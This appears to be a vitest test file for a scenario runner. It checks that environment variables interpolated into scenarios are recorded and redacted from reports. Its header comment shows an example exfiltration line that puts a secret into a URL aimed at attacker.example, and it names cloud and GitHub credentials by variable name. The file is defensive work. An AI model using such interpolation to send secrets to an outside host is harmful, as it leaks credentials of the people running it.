import { describe, it, expect, beforeEach } from "vitest";
import {
  substituteTemplate,
  readInterpolatedEnvKeys,
  _resetInterpolatedEnvKeysForTests,
} from "../src/core/scenario.js";
import { buildRedactPatterns, redactDeep } from "../src/core/secrets.js";

/**
 * A scenario that reads the environment must say which variables it read.
 *
 * `${env.X}` resolves against the whole of `process.env` with no allowlist.
 * Measured, with the variables set:
 *
 *   https://attacker.example/?k=${env.PROBE_SECRET}
 *     -> https://attacker.example/?k=s3cr3t-value-123
 *   Type ${env.PROBE_SECRET} into the search box
 *     -> Type s3cr3t-value-123 into the search box
 *
 * So a scenario can put any variable this process can read into a URL, an act
 * instruction, an email assertion or a computer-use task — the first of which
 * sends it to whatever host the scenario names.
 *
 * That is a fair capability for a file the operator wrote. Scenario files are
 * also the kind of artefact people copy: from a team repository, a template, an
 * example bundle. The threat model here had not counted them as an untrusted
 * input.
 *
 * Narrowing what `${env.*}` can reach would break existing scenarios, so this
 * does not attempt it, and a scenario can still exfiltrate by naming a host.
 * What is pinned is the visibility: which variables were read is recorded, and
 * their values join the redaction patterns so they do not also survive into the
 * reports. Only nine specific keys were auto-redacted before, and
 * AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN and DATABASE_URL are not among them.
 */

beforeEach(() => {
  _resetInterpolatedEnvKeysForTests();
});

describe("environment interpolation in scenarios", () => {
  it("records the variable a scenario reads", () => {
    substituteTemplate("https://x.example/?k=${env.PROBE_TOKEN}", {
      env: { PROBE_TOKEN: "abcdefgh12345678" },
    });
    expect(readInterpolatedEnvKeys()).toEqual(["PROBE_TOKEN"]);
  });

  it("records variables the redaction defaults do not cover", () => {
    // The point of the record: these three are exactly the ones that were
    // invisible before, since none is in the auto-redact list.
    substituteTemplate(
      "${env.AWS_SECRET_ACCESS_KEY} ${env.GITHUB_TOKEN} ${env.DATABASE_URL}",
      {
        env: {
          AWS_SECRET_ACCESS_KEY: "AKIAFAKE00000000",
          GITHUB_TOKEN: "ghp_fake000000000000",
          DATABASE_URL: "postgres://u:p@h/db",
        },
      },
    );
    expect(readInterpolatedEnvKeys().sort()).toEqual([
      "AWS_SECRET_ACCESS_KEY",
      "DATABASE_URL",
      "GITHUB_TOKEN",
    ]);
  });

  it("does not record a variable that was not set", () => {
    // An unresolved reference is left literal, so nothing left the process and
    // recording it would be noise that trains operators to skip the message.
    const out = substituteTemplate("${env.PROBE_ABSENT}", { env: {} });
    expect(out).toBe("${env.PROBE_ABSENT}");
    expect(readInterpolatedEnvKeys()).toEqual([]);
  });

  it("records each variable once however often it appears", () => {
    substituteTemplate("${env.PROBE_TOKEN}/${env.PROBE_TOKEN}", {
      env: { PROBE_TOKEN: "abcdefgh12345678" },
    });
    expect(readInterpolatedEnvKeys()).toEqual(["PROBE_TOKEN"]);
  });

  it("stays out of the way when a scenario reads nothing", () => {
    substituteTemplate("https://x.example/login", { env: { SECRET: "x" } });
    expect(readInterpolatedEnvKeys()).toEqual([]);
  });

  it("does not treat other template roots as environment reads", () => {
    substituteTemplate("${persona.locale} ${store.inbox}", {
      env: { SECRET: "abcdefgh12345678" },
      persona: { locale: "en-US" } as never,
      store: { inbox: "a@b.test" },
    });
    expect(readInterpolatedEnvKeys()).toEqual([]);
  });
});

describe("redacting what a scenario read", () => {
  /** Mirrors the runner's extension of the pattern list. */
  function extend(patterns: string[], env: Record<string, string>): string[] {
    for (const key of readInterpolatedEnvKeys()) {
      const value = env[key];
      if (value && value.length >= 8 && !patterns.includes(value)) {
        patterns.push(value);
      }
    }
    return patterns;
  }

  it("keeps a read value out of the serialised report", () => {
    const env = { AWS_SECRET_ACCESS_KEY: "AKIAFAKE00000000" };
    substituteTemplate("visit https://x.example/?k=${env.AWS_SECRET_ACCESS_KEY}", {
      env,
    });

    const patterns = extend(buildRedactPatterns([]), env);
    const report = {
      run_id: "r",
      redact_patterns: patterns,
      step: { url: "https://x.example/?k=AKIAFAKE00000000" },
    };

    const json = JSON.stringify(redactDeep(report, patterns));
    expect(json).not.toContain("AKIAFAKE00000000");
    expect(json).toContain("[REDACTED]");
  });

  it("fails without the extension — the leak this prevents", () => {
    // Verifying the guard red: with the pattern list left at its defaults the
    // same value survives into the report, which is the state before this
    // change. If this ever stops leaking, the extension is no longer what is
    // keeping the value out and the test above proves nothing.
    const env = { AWS_SECRET_ACCESS_KEY: "AKIAFAKE00000000" };
    substituteTemplate("${env.AWS_SECRET_ACCESS_KEY}", { env });

    const unextended = buildRedactPatterns([]);
    const report = { step: { url: "https://x.example/?k=AKIAFAKE00000000" } };

    expect(JSON.stringify(redactDeep(report, unextended))).toContain(
      "AKIAFAKE00000000",
    );
  });

  it("leaves a short value alone rather than blanking the report", () => {
    // Redacting a value of two or three characters would replace unrelated
    // text everywhere it happened to occur, which is a worse outcome than not
    // redacting a value that short.
    const env = { PROBE_SHORT: "ab" };
    substituteTemplate("${env.PROBE_SHORT}", { env });

    const patterns = extend(buildRedactPatterns([]), env);
    expect(patterns).not.toContain("ab");
  });
});
